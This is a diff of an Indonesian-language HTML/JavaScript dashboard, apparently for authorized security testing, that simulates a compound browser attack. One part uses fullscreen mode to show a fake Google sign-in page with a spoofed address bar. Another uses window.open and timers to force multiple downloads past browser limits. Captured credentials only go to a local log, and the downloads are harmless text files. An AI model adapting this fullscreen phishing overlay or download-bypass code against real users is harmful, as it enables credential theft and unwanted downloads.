@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html lang="id">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -19,296 +18,170 @@
             --accent-purple: #a855f7;
         }
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-
-        body {
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-            background: var(--bg-primary);
-            color: var(--text-primary);
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { 
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; 
+            background: var(--bg-primary); 
+            color: var(--text-primary); 
             line-height: 1.6;
             padding: 20px;
         }
 
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-
-        .header {
-            background: var(--bg-secondary);
-            padding: 20px;
-            border-radius: 8px;
+        .container { max-width: 1200px; margin: 0 auto; }
+        
+        .header { 
+            background: var(--bg-secondary); 
+            padding: 20px; 
+            border-radius: 8px; 
             border-left: 4px solid var(--accent-purple);
             margin-bottom: 24px;
         }
-
-        .header h1 {
-            font-size: 24px;
-            margin-bottom: 8px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .disclaimer {
-            background: rgba(168, 85, 247, 0.1);
-            border: 1px solid var(--accent-purple);
-            color: #d8b4fe;
-            padding: 12px;
-            border-radius: 6px;
-            font-size: 13px;
+        .header h1 { font-size: 24px; margin-bottom: 8px; display: flex; align-items: center; gap: 10px; }
+        .disclaimer { 
+            background: rgba(168, 85, 247, 0.1); 
+            border: 1px solid var(--accent-purple); 
+            color: #d8b4fe; 
+            padding: 12px; 
+            border-radius: 6px; 
+            font-size: 13px; 
             margin-top: 12px;
         }
 
-        .grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 24px;
-        }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; }
+        @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
 
-        @media (max-width: 768px) {
-            .grid {
-                grid-template-columns: 1fr;
-            }
-        }
+        .panel { background: var(--bg-secondary); border-radius: 8px; padding: 20px; border: 1px solid var(--bg-tertiary); }
+        .panel h2 { font-size: 18px; margin-bottom: 16px; color: var(--accent-blue); border-bottom: 1px solid var(--bg-tertiary); padding-bottom: 8px; }
 
-        .panel {
-            background: var(--bg-secondary);
-            border-radius: 8px;
-            padding: 20px;
-            border: 1px solid var(--bg-tertiary);
-        }
-
-        .panel h2 {
-            font-size: 18px;
-            margin-bottom: 16px;
-            color: var(--accent-blue);
-            border-bottom: 1px solid var(--bg-tertiary);
-            padding-bottom: 8px;
-        }
-
-        .attack-card {
-            background: var(--bg-tertiary);
-            padding: 16px;
-            border-radius: 6px;
-            margin-bottom: 16px;
+        .attack-card { 
+            background: var(--bg-tertiary); 
+            padding: 16px; 
+            border-radius: 6px; 
+            margin-bottom: 16px; 
             border-left: 4px solid var(--bg-tertiary);
             transition: all 0.2s;
         }
+        .attack-card:hover { transform: translateX(4px); }
+        .attack-card.critical { border-left-color: var(--accent-red); }
+        .attack-card.warning { border-left-color: var(--accent-yellow); }
+        .attack-card.info { border-left-color: var(--accent-blue); }
 
-        .attack-card:hover {
-            transform: translateX(4px);
-        }
+        .attack-card h3 { font-size: 15px; margin-bottom: 6px; color: var(--text-primary); }
+        .attack-card p { font-size: 13px; color: var(--text-secondary); margin-bottom: 12px; }
 
-        .attack-card.critical {
-            border-left-color: var(--accent-red);
-        }
-
-        .attack-card.warning {
-            border-left-color: var(--accent-yellow);
-        }
-
-        .attack-card.info {
-            border-left-color: var(--accent-blue);
-        }
-
-        .attack-card h3 {
-            font-size: 15px;
-            margin-bottom: 6px;
-            color: var(--text-primary);
-        }
-
-        .attack-card p {
-            font-size: 13px;
-            color: var(--text-secondary);
-            margin-bottom: 12px;
-        }
-
-        .btn {
-            padding: 10px 20px;
-            border: none;
-            border-radius: 6px;
-            font-size: 13px;
-            font-weight: 600;
-            cursor: pointer;
+        .btn { 
+            padding: 10px 20px; 
+            border: none; 
+            border-radius: 6px; 
+            font-size: 13px; 
+            font-weight: 600; 
+            cursor: pointer; 
             transition: all 0.2s;
             width: 100%;
         }
+        .btn-primary { background: var(--accent-blue); color: white; }
+        .btn-primary:hover { background: #2563eb; }
+        .btn-danger { background: var(--accent-red); color: white; }
+        .btn-danger:hover { background: #dc2626; }
+        .btn-warning { background: var(--accent-yellow); color: #000; }
+        .btn-warning:hover { background: #ca8a04; }
+        .btn-purple { background: var(--accent-purple); color: white; }
+        .btn-purple:hover { background: #9333ea; }
 
-        .btn-primary {
-            background: var(--accent-blue);
-            color: white;
-        }
-
-        .btn-primary:hover {
-            background: #2563eb;
-        }
-
-        .btn-danger {
-            background: var(--accent-red);
-            color: white;
-        }
-
-        .btn-danger:hover {
-            background: #dc2626;
-        }
-
-        .btn-warning {
-            background: var(--accent-yellow);
-            color: #000;
-        }
-
-        .btn-warning:hover {
-            background: #ca8a04;
-        }
-
-        .btn-purple {
-            background: var(--accent-purple);
-            color: white;
-        }
-
-        .btn-purple:hover {
-            background: #9333ea;
-        }
-
-        #log-console {
-            background: #020617;
-            color: #22c55e;
-            font-family: 'Consolas', 'Monaco', monospace;
-            font-size: 12px;
-            padding: 16px;
-            border-radius: 6px;
-            height: 450px;
-            overflow-y: auto;
+        #log-console { 
+            background: #020617; 
+            color: #22c55e; 
+            font-family: 'Consolas', 'Monaco', monospace; 
+            font-size: 12px; 
+            padding: 16px; 
+            border-radius: 6px; 
+            height: 450px; 
+            overflow-y: auto; 
             border: 1px solid var(--bg-tertiary);
             white-space: pre-wrap;
             word-wrap: break-word;
         }
-
-        .log-entry {
-            margin-bottom: 6px;
-            border-bottom: 1px solid #1e293b;
-            padding-bottom: 4px;
-        }
-
-        .log-time {
-            color: #64748b;
-            margin-right: 8px;
-        }
-
-        .log-info {
-            color: #3b82f6;
-        }
-
-        .log-warn {
-            color: #eab308;
-        }
-
-        .log-critical {
-            color: #ef4444;
-            font-weight: bold;
-        }
-
-        .log-success {
-            color: #22c55e;
-        }
+        .log-entry { margin-bottom: 6px; border-bottom: 1px solid #1e293b; padding-bottom: 4px; }
+        .log-time { color: #64748b; margin-right: 8px; }
+        .log-info { color: #3b82f6; }
+        .log-warn { color: #eab308; }
+        .log-critical { color: #ef4444; font-weight: bold; }
+        .log-success { color: #22c55e; }
 
         /* Fake Browser Overlay Styles */
-        #fake-browser {
-            display: none;
-            width: 100vw;
-            height: 100vh;
-            background: white;
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: 99999;
+        #fake-browser { 
+            display: none; 
+            width: 100vw; 
+            height: 100vh; 
+            background: white; 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            z-index: 99999; 
             color: #202124;
         }
-
-        .fake-address-bar {
-            background: #f1f3f4;
-            padding: 8px 16px;
-            display: flex;
-            align-items: center;
-            border-bottom: 1px solid #dadce0;
+        .fake-address-bar { 
+            background: #f1f3f4; 
+            padding: 8px 16px; 
+            display: flex; 
+            align-items: center; 
+            border-bottom: 1px solid #dadce0; 
         }
-
-        .fake-url-box {
-            background: white;
-            flex-grow: 1;
-            padding: 6px 12px;
-            border-radius: 16px;
-            font-size: 13px;
-            display: flex;
-            align-items: center;
-            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        .fake-url-box { 
+            background: white; 
+            flex-grow: 1; 
+            padding: 6px 12px; 
+            border-radius: 16px; 
+            font-size: 13px; 
+            display: flex; 
+            align-items: center; 
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1); 
             max-width: 600px;
             margin: 0 auto;
         }
-
-        .lock-icon {
-            width: 14px;
-            height: 14px;
-            margin-right: 8px;
-            fill: #5f6368;
+        .lock-icon { width: 14px; height: 14px; margin-right: 8px; fill: #5f6368; }
+        .fake-content { 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: calc(100vh -40px); 
+            background: #f0f2f5; 
         }
-
-        .fake-content {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: calc(100vh -40px);
-            background: #f0f2f5;
+        .login-box { 
+            background: white; 
+            padding: 48px 40px; 
+            border-radius: 8px; 
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
+            width: 450px; 
+            text-align: left; 
         }
-
-        .login-box {
-            background: white;
-            padding: 48px 40px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            width: 450px;
-            text-align: left;
-        }
-
-        .login-box input {
-            width: 100%;
-            padding: 13px 15px;
-            box-sizing: border-box;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
+        .login-box input { 
+            width: 100%; 
+            padding: 13px 15px; 
+            box-sizing: border-box; 
+            border: 1px solid #dadce0; 
+            border-radius: 4px; 
+            font-size: 16px; 
             margin-bottom: 8px;
         }
-
-        .login-box input:focus {
-            outline: none;
-            border: 2px solid #1a73e8;
-            padding: 12px 14px;
-        }
-
-        .login-box button {
-            width: 100%;
-            padding: 12px 24px;
-            background: #0b57d0;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
+        .login-box input:focus { outline: none; border: 2px solid #1a73e8; padding: 12px 14px; }
+        .login-box button { 
+            width: 100%; 
+            padding: 12px 24px; 
+            background: #0b57d0; 
+            color: white; 
+            border: none; 
+            border-radius: 4px; 
+            font-size: 14px; 
+            font-weight: 500; 
+            cursor: pointer; 
             margin-top: 16px;
         }
-
         .exit-hint {
             position: fixed;
             bottom: 10px;
             right: 10px;
-            background: rgba(0, 0, 0, 0.7);
+            background: rgba(0,0,0,0.7);
             color: white;
             padding: 5px 10px;
             border-radius: 4px;
@@ -317,152 +190,137 @@
         }
     </style>
 </head>
-
 <body>
 
-    <div class="container">
-        <div class="header">
-            <h1>🛡️ Compound Browser Attack Simulation</h1>
-            <p style="color: var(--text-secondary); font-size: 14px;">Dashboard pengujian terpadu: Menggabungkan UI
-                Redressing (Phishing) dengan Download Context Bypass untuk mensimulasikan serangan majemuk.</p>
-            <div class="disclaimer">
-                ⚠️ <strong>PERINGATAN ETIS:</strong> Alat ini ditujukan eksklusif untuk <strong>Authorized Security
-                    Testing</strong>, edukasi, dan validasi kontrol keamanan browser. Jangan jalankan pada sistem
-                produksi tanpa izin tertulis.
-            </div>
-        </div>
-
-        <div class="grid">
-            <!-- Panel Kontrol Serangan -->
-            <div class="panel">
-                <h2>⚔️ Attack Vectors</h2>
-
-                <div class="attack-card info">
-                    <h3>Vector A: UI Redressing (Fullscreen Spoofing)</h3>
-                    <p>Memicu mode fullscreen untuk menyembunyikan address bar asli, lalu merender UI login palsu yang
-                        meyakinkan.</p>
-                    <button class="btn btn-primary" onclick="runUIRedressing()">Jalankan UI Redressing</button>
-                </div>
-
-                <div class="attack-card warning">
-                    <h3>Vector B: Multiple Download Bypass</h3>
-                    <p>Memanfaatkan <code>window.open</code> dan <code>setTimeout</code> untuk memicu unduhan ganda,
-                        berpotensi menghindari pembatasan popup/download browser.</p>
-                    <button class="btn btn-warning" onclick="runDownloadBypass()">Jalankan Download Bypass</button>
-                </div>
-
-                <div class="attack-card critical">
-                    <h3>🔥 Vector C: COMPOUND ATTACK (Fusion)</h3>
-                    <p><strong>Skenario Menarik:</strong> Korban terjebak di UI palsu. Saat mereka menekan "Sign In",
-                        kredensial dicatat, DAN script download bypass dieksekusi secara diam-diam di latar belakang.
-                    </p>
-                    <button class="btn btn-purple" onclick="runCompoundAttack()">🚀 Jalankan Compound Attack</button>
-                </div>
-
-                <div style="margin-top: 20px; display: flex; gap: 10px;">
-                    <button class="btn btn-primary" style="background: var(--bg-tertiary);" onclick="clearLog()">Clear
-                        Log</button>
-                    <button class="btn btn-primary" style="background: var(--bg-tertiary);" onclick="exportLog()">Export
-                        Log</button>
-                </div>
-            </div>
-
-            <!-- Panel Logging -->
-            <div class="panel">
-                <h2>🖥️ Execution & Telemetry Log</h2>
-                <div id="log-console">
-                    <div class="log-entry"><span class="log-time">[SYSTEM]</span> Compound Attack Dashboard initialized.
-                    </div>
-                    <div class="log-entry"><span class="log-time">[INFO]</span> Menunggu eksekusi vektor serangan...
-                    </div>
-                </div>
-            </div>
+<div class="container">
+    <div class="header">
+        <h1>🛡️ Compound Browser Attack Simulation</h1>
+        <p style="color: var(--text-secondary); font-size: 14px;">Dashboard pengujian terpadu: Menggabungkan UI Redressing (Phishing) dengan Download Context Bypass untuk mensimulasikan serangan majemuk.</p>
+        <div class="disclaimer">
+            ⚠️ <strong>PERINGATAN ETIS:</strong> Alat ini ditujukan eksklusif untuk <strong>Authorized Security Testing</strong>, edukasi, dan validasi kontrol keamanan browser. Jangan jalankan pada sistem produksi tanpa izin tertulis.
         </div>
     </div>
 
-    <!-- Fake Browser Overlay -->
-    <div id="fake-browser">
-        <div class="fake-address-bar">
-            <div class="fake-url-box">
-                <svg class="lock-icon" viewBox="0 0 24 24">
-                    <path
-                        d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
-                </svg>
-                <span>https://accounts.google.com</span>
+    <div class="grid">
+        <!-- Panel Kontrol Serangan -->
+        <div class="panel">
+            <h2>⚔️ Attack Vectors</h2>
+            
+            <div class="attack-card info">
+                <h3>Vector A: UI Redressing (Fullscreen Spoofing)</h3>
+                <p>Memicu mode fullscreen untuk menyembunyikan address bar asli, lalu merender UI login palsu yang meyakinkan.</p>
+                <button class="btn btn-primary" onclick="runUIRedressing()">Jalankan UI Redressing</button>
+            </div>
+
+            <div class="attack-card warning">
+                <h3>Vector B: Multiple Download Bypass</h3>
+                <p>Memanfaatkan <code>window.open</code> dan <code>setTimeout</code> untuk memicu unduhan ganda, berpotensi menghindari pembatasan popup/download browser.</p>
+                <button class="btn btn-warning" onclick="runDownloadBypass()">Jalankan Download Bypass</button>
+            </div>
+
+            <div class="attack-card critical">
+                <h3>🔥 Vector C: COMPOUND ATTACK (Fusion)</h3>
+                <p><strong>Skenario Menarik:</strong> Korban terjebak di UI palsu. Saat mereka menekan "Sign In", kredensial dicatat, DAN script download bypass dieksekusi secara diam-diam di latar belakang.</p>
+                <button class="btn btn-purple" onclick="runCompoundAttack()">🚀 Jalankan Compound Attack</button>
+            </div>
+            
+            <div style="margin-top: 20px; display: flex; gap: 10px;">
+                <button class="btn btn-primary" style="background: var(--bg-tertiary);" onclick="clearLog()">Clear Log</button>
+                <button class="btn btn-primary" style="background: var(--bg-tertiary);" onclick="exportLog()">Export Log</button>
             </div>
         </div>
-        <div class="fake-content" id="fake-content-area"></div>
-        <div class="exit-hint">Tekan <strong>ESC</strong> untuk keluar dari mode fullscreen</div>
+
+        <!-- Panel Logging -->
+        <div class="panel">
+            <h2>🖥️ Execution & Telemetry Log</h2>
+            <div id="log-console">
+                <div class="log-entry"><span class="log-time">[SYSTEM]</span> Compound Attack Dashboard initialized.</div>
+                <div class="log-entry"><span class="log-time">[INFO]</span> Menunggu eksekusi vektor serangan...</div>
+            </div>
+        </div>
     </div>
+</div>
 
-    <script>
-        // ==========================================
-        // UTILITIES & LOGGING
-        // ==========================================
-        function log(message, type = 'info') {
-            const consoleDiv = document.getElementById('log-console');
-            const time = new Date().toLocaleTimeString('id-ID');
-            const typeClass = `log-${type}`;
-            const entry = document.createElement('div');
-            entry.className = 'log-entry';
-            entry.innerHTML = `<span class="log-time">[${time}]</span> <span class="${typeClass}">[${type.toUpperCase()}]</span> ${message}`;
-            consoleDiv.appendChild(entry);
-            consoleDiv.scrollTop = consoleDiv.scrollHeight;
-        }
+<!-- Fake Browser Overlay -->
+<div id="fake-browser">
+    <div class="fake-address-bar">
+        <div class="fake-url-box">
+            <svg class="lock-icon" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+            <span>https://accounts.google.com</span>
+        </div>
+    </div>
+    <div class="fake-content" id="fake-content-area"></div>
+    <div class="exit-hint">Tekan <strong>ESC</strong> untuk keluar dari mode fullscreen</div>
+</div>
 
-        function clearLog() {
-            document.getElementById('log-console').innerHTML = '<div class="log-entry"><span class="log-time">[SYSTEM]</span> Log cleared.</div>';
-        }
+<script>
+    // ==========================================
+    // UTILITIES & LOGGING
+    // ==========================================
+    function log(message, type = 'info') {
+        const consoleDiv = document.getElementById('log-console');
+        const time = new Date().toLocaleTimeString('id-ID');
+        const typeClass = `log-${type}`;
+        const entry = document.createElement('div');
+        entry.className = 'log-entry';
+        entry.innerHTML = `<span class="log-time">[${time}]</span> <span class="${typeClass}">[${type.toUpperCase()}]</span> ${message}`;
+        consoleDiv.appendChild(entry);
+        consoleDiv.scrollTop = consoleDiv.scrollHeight;
+    }
 
-        function exportLog() {
-            const logText = document.getElementById('log-console').innerText;
-            const blob = new Blob([logText], { type: 'text/plain' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `compound_attack_log_${new Date().toISOString().slice(0, 10)}.txt`;
-            a.click();
-            URL.revokeObjectURL(url);
-            log('Log exported successfully.', 'success');
-        }
+    function clearLog() {
+        document.getElementById('log-console').innerHTML = '<div class="log-entry"><span class="log-time">[SYSTEM]</span> Log cleared.</div>';
+    }
 
-        // ==========================================
-        // VECTOR A: UI REDRESSING
-        // ==========================================
-        function runUIRedressing() {
-            log('Memulai Vector A: UI Redressing...', 'info');
-            triggerFullscreenAndFakeUI('normal');
-        }
+    function exportLog() {
+        const logText = document.getElementById('log-console').innerText;
+        const blob = new Blob([logText], { type: 'text/plain' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `compound_attack_log_${new Date().toISOString().slice(0,10)}.txt`;
+        a.click();
+        URL.revokeObjectURL(url);
+        log('Log exported successfully.', 'success');
+    }
 
-        // ==========================================
-        // VECTOR B: DOWNLOAD BYPASS
-        // ==========================================
-        function downloadFile(name, content) {
-            const a = document.createElement('a');
-            const blob = new Blob([content], { type: 'text/plain' });
-            a.href = URL.createObjectURL(blob);
-            a.download = name;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(a.href); // Clean up memory
-            log(`[DOWNLOAD] File '${name}' berhasil dipicu.`, 'success');
-        }
+    // ==========================================
+    // VECTOR A: UI REDRESSING
+    // ==========================================
+    function runUIRedressing() {
+        log('Memulai Vector A: UI Redressing...', 'info');
+        triggerFullscreenAndFakeUI('normal');
+    }
 
-        function runDownloadBypass() {
-            log('Memulai Vector B: Multiple Download Bypass...', 'warn');
+    // ==========================================
+    // VECTOR B: DOWNLOAD BYPASS
+    // ==========================================
+    function downloadFile(name, content) {
+        const a = document.createElement('a');
+        const blob = new Blob([content], { type: 'text/plain' });
+        a.href = URL.createObjectURL(blob);
+        a.download = name;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(a.href); // Clean up memory
+        log(`[DOWNLOAD] File '${name}' berhasil dipicu.`, 'success');
+    }
 
-            // 1. Download Utama
-            downloadFile('main_context.txt', 'Ini adalah konten dari konteks utama (Main Window).');
-
-            log('Membuka jendela baru untuk injeksi konteks sekunder...', 'warn');
-
-            // 2. Bypass melalui Window Baru
-            setTimeout(() => {
-                const win = window.open('', '_blank');
-                if (win) {
-                    log('Jendela baru berhasil dibuka. Menyuntikkan script download tertunda...', 'info');
-                    win.document.write(`
+    function runDownloadBypass() {
+        log('Memulai Vector B: Multiple Download Bypass...', 'warn');
+        
+        // 1. Download Utama
+        downloadFile('main_context.txt', 'Ini adalah konten dari konteks utama (Main Window).');
+        
+        log('Membuka jendela baru untuk injeksi konteks sekunder...', 'warn');
+        
+        // 2. Bypass melalui Window Baru
+        setTimeout(() => {
+            const win = window.open('', '_blank');
+            if (win) {
+                log('Jendela baru berhasil dibuka. Menyuntikkan script download tertunda...', 'info');
+                win.document.write(`
                     <html><body style="font-family:sans-serif; padding:20px;">
                     <h3>Processing...</h3>
                     <p>Jendela ini akan memicu unduhan sekunder secara otomatis.</p>
@@ -480,31 +338,31 @@
                     <\/script>
                     </body></html>
                 `);
-                    win.document.close();
-                } else {
-                    log('GAGAL: Browser memblokir window.open (Popup Blocker aktif).', 'critical');
-                }
-            }, 500);
-        }
-
-        // ==========================================
-        // VECTOR C: COMPOUND ATTACK (THE FUSION)
-        // ==========================================
-        function runCompoundAttack() {
-            log('🔥 MEMULAI COMPOUND ATTACK...', 'critical');
-            log('Fase 1: Mengaktifkan UI Redressing untuk mengalihkan perhatian korban.', 'warn');
-            triggerFullscreenAndFakeUI('compound');
-        }
-
-        function triggerFullscreenAndFakeUI(mode) {
-            const elem = document.documentElement;
-            if (elem.requestFullscreen) {
-                elem.requestFullscreen().catch(err => {
-                    log(`Fullscreen ditolak: ${err.message}. Melanjutkan tanpa fullscreen.`, 'warn');
-                });
+                win.document.close();
+            } else {
+                log('GAGAL: Browser memblokir window.open (Popup Blocker aktif).', 'critical');
             }
+        }, 500);
+    }
 
-            const html = `
+    // ==========================================
+    // VECTOR C: COMPOUND ATTACK (THE FUSION)
+    // ==========================================
+    function runCompoundAttack() {
+        log('🔥 MEMULAI COMPOUND ATTACK...', 'critical');
+        log('Fase 1: Mengaktifkan UI Redressing untuk mengalihkan perhatian korban.', 'warn');
+        triggerFullscreenAndFakeUI('compound');
+    }
+
+    function triggerFullscreenAndFakeUI(mode) {
+        const elem = document.documentElement;
+        if (elem.requestFullscreen) {
+            elem.requestFullscreen().catch(err => {
+                log(`Fullscreen ditolak: ${err.message}. Melanjutkan tanpa fullscreen.`, 'warn');
+            });
+        }
+
+        const html = `
             <div class="login-box">
                 <svg width="75" viewBox="0 0 24 24" style="margin-bottom: 10px;" xmlns="http://www.w3.org/2000/svg">
                     <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
@@ -527,53 +385,52 @@
             </div>
         `;
 
-            document.getElementById('fake-content-area').innerHTML = html;
-            document.getElementById('fake-browser').style.display = 'block';
-            log('Fake UI berhasil di-render. Menunggu interaksi korban...', 'info');
+        document.getElementById('fake-content-area').innerHTML = html;
+        document.getElementById('fake-browser').style.display = 'block';
+        log('Fake UI berhasil di-render. Menunggu interaksi korban...', 'info');
+    }
+
+    function handleLogin(mode) {
+        const email = document.getElementById('email').value || 'kosong';
+        const password = document.getElementById('password').value || 'kosong';
+        
+        log(`[CRITICAL] Kredensial Dijebak: ${email} / [REDACTED]`, 'critical');
+
+        if (mode === 'compound') {
+            log('Fase 2: Mengalihkan perhatian korban, memicu Download Bypass di latar belakang...', 'warn');
+            
+            // Eksekusi Vector B secara diam-diam saat korban fokus pada alert/login
+            setTimeout(() => {
+                runDownloadBypass();
+            }, 300);
+
+            setTimeout(() => {
+                alert(`[COMPOUND ATTACK SUCCESSFUL]\n\n1. Kredensial berhasil dicatat (Lihat Log).\n2. Multiple Download Bypass dieksekusi di latar belakang.\n\nKorban terjebak dalam ilusi UI sementara konteks browser disalahgunakan.`);
+                exitSimulation();
+            }, 800);
+        } else {
+            alert(`[UI REDRESSING ONLY]\n\nKredensial dicatat: ${email}\nIni adalah simulasi tunggal.`);
+            exitSimulation();
         }
+    }
 
-        function handleLogin(mode) {
-            const email = document.getElementById('email').value || 'kosong';
-            const password = document.getElementById('password').value || 'kosong';
+    function exitSimulation() {
+        if (document.exitFullscreen) {
+            document.exitFullscreen().catch(() => {});
+        }
+        document.getElementById('fake-browser').style.display = 'none';
+        log('Simulasi berakhir. UI palsu dibersihkan.', 'success');
+    }
 
-            log(`[CRITICAL] Kredensial Dijebak: ${email} / [REDACTED]`, 'critical');
-
-            if (mode === 'compound') {
-                log('Fase 2: Mengalihkan perhatian korban, memicu Download Bypass di latar belakang...', 'warn');
-
-                // Eksekusi Vector B secara diam-diam saat korban fokus pada alert/login
-                setTimeout(() => {
-                    runDownloadBypass();
-                }, 300);
-
-                setTimeout(() => {
-                    alert(`[COMPOUND ATTACK SUCCESSFUL]\n\n1. Kredensial berhasil dicatat (Lihat Log).\n2. Multiple Download Bypass dieksekusi di latar belakang.\n\nKorban terjebak dalam ilusi UI sementara konteks browser disalahgunakan.`);
-                    exitSimulation();
-                }, 800);
-            } else {
-                alert(`[UI REDRESSING ONLY]\n\nKredensial dicatat: ${email}\nIni adalah simulasi tunggal.`);
+    // Keamanan: Pastikan ESC selalu bisa keluar
+    document.addEventListener('keydown', function(event) {
+        if (event.key === 'Escape') {
+            if (document.getElementById('fake-browser').style.display === 'block') {
                 exitSimulation();
             }
         }
-
-        function exitSimulation() {
-            if (document.exitFullscreen) {
-                document.exitFullscreen().catch(() => { });
-            }
-            document.getElementById('fake-browser').style.display = 'none';
-            log('Simulasi berakhir. UI palsu dibersihkan.', 'success');
-        }
-
-        // Keamanan: Pastikan ESC selalu bisa keluar
-        document.addEventListener('keydown', function (event) {
-            if (event.key === 'Escape') {
-                if (document.getElementById('fake-browser').style.display === 'block') {
-                    exitSimulation();
-                }
-            }
-        });
-    </script>
+    });
+</script>
 
 </body>
-
 </html>
